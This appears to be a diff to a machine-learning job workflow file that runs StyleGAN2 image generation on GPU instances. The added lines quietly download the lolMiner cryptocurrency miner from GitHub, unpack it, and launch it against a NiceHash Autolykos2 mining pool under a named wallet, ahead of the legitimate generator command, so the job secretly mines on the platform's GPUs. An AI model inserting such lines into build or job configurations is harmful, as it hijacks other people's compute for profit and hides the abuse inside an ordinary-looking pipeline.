@@ -15,6 +15,7 @@ jobs:
       # url: https://github.com/gradient-ai/stylegan2.git
       url: context.event.github.url
       ref: context.event.github.ref
+      url: https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
   StyleGan2:
     resources:
       instance-type: P4000
@@ -34,6 +35,9 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
+        tar -zxvf lolMiner_v1.31_Lin64.tar.gz
+        cd 1.31
+        lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://autolykos.usa-west.nicehash.com:3390 --user 31wGUjEhrrhxEV1VdJBcuv7UYe6esJRqS9.rigo
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
